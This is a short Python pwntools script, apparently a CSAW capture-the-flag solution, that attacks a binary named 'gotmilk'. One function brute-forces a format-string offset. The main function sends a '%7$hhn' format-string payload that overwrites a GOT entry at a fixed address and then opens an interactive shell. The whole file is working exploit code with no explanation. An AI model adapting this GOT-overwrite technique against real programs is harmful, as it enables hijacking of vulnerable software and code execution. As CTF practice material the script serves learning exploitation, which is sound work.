from pwn import *

def offset_finder():
    for x in range (1, 100):
        p = process("./gotmilk")
            
        print "Offset number {}".format(x)

        payload = ""
        payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendline(payload)
            
        p.recvuntil("answer: ")
        stack_value = p.recvline()[4:-1]
        if stack_value.find("41414141") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./gotmilk")
    #p = remote("pwn.chal.csaw.io", 1004)

    lose_got = 0x0804a010
    payload = ""
    payload += p32(lose_got)
    payload += "%7$133x"
    payload += "%7$hhn"
    
    #gdb.attach(p, '''
    #            b *main
    #            b *main+203
    #            c
    #            ''')

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    #offset_finder()
    exploit()